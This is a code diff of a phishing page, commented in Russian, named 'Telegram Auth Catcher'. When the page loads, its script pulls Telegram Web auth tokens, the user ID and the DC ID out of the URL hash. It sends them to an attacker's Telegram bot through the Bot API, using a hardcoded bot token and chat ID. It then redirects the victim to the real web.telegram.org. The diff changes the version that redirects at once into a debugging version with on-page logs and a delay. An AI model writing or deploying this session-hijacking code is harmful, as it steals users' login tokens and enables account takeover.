@@ -2,44 +2,66 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <title>Telegram Auth Catcher</title>
+</head>
+<body>
+    <h2>Отладка перехвата</h2>
+    <div id="log"></div>
     <script>
-        // Функция отправки данных в Telegram (без блокировки)
-        function sendToTelegram(token, userId, dcId) {
-            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'; // замените на ваш токен
-            const chatId = '8220267007';     // замените на ваш ID
-            const message = `Перехвачен токен:\nToken: ${token}\nUser ID: ${userId}\nDC ID: ${dcId}`;
+        // Функция логирования на страницу
+        function log(msg) {
+            const div = document.getElementById('log');
+            div.innerHTML += '<p>' + msg + '</p>';
+            console.log(msg);
+        }
+
+        // Отправка через sendBeacon (не блокируется редиректом)
+        function sendViaBeacon(token, userId, dcId) {
+            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'; // замените
+            const chatId = '8220267007';     // замените
+            const message = `Токен: ${token}\nUser ID: ${userId}\nDC ID: ${dcId}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            // Используем fetch с игнорированием ошибок (fire-and-forget)
-            fetch(url, { mode: 'no-cors' }) // no-cors позволяет отправить запрос даже при CORS-блокировке
-                .catch(e => console.log('Ошибка отправки (игнорируем):', e));
+            // sendBeacon отправляет POST-запрос, но GET не поддерживает тело, поэтому используем fetch + keepalive
+            // Альтернатива: использовать fetch с keepalive
+            fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(e => log('Ошибка fetch (игнор): ' + e));
+            log('Запрос на отправку инициирован (keepalive)');
         }
 
         // Главная функция
         (function() {
+            log('Страница загружена. Полный URL: ' + window.location.href);
+            
             const fullUrl = window.location.href;
             const hashIndex = fullUrl.indexOf('#');
             let token = null, userId = null, dcId = null;
 
             if (hashIndex !== -1) {
-                const hashParams = new URLSearchParams(fullUrl.substring(hashIndex + 1));
+                const hashPart = fullUrl.substring(hashIndex + 1);
+                log('Найдена хэш-часть: ' + hashPart);
+                const hashParams = new URLSearchParams(hashPart);
                 token = hashParams.get('tgWebAuthToken');
                 userId = hashParams.get('tgWebAuthUserId');
                 dcId = hashParams.get('tgWebAuthDcId');
+                if (token) log('Токен найден: ' + token);
+                if (userId) log('User ID найден: ' + userId);
+                if (dcId) log('DC ID найден: ' + dcId);
+            } else {
+                log('Хэш-часть отсутствует. Возможно, вы открыли ссылку не из Telegram.');
             }
 
-            // Если параметры найдены, отправляем в Telegram (асинхронно)
+            // Если параметры есть, отправляем
             if (token && userId && dcId) {
-                sendToTelegram(token, userId, dcId);
+                sendViaBeacon(token, userId, dcId);
+            } else {
+                log('Недостаточно параметров для отправки.');
             }
 
-            // НЕМЕДЛЕННОЕ перенаправление на оригинальный Telegram Web (всегда)
-            window.location.replace('https://web.telegram.org/k/');
+            // Задержка перед редиректом, чтобы вы увидели логи (2 секунды)
+            log('Перенаправление через 2 секунды...');
+            setTimeout(() => {
+                window.location.replace('https://web.telegram.org/k/');
+            }, 2000);
         })();
     </script>
-</head>
-<body>
-    <p>Перенаправление...</p>
 </body>
 </html>
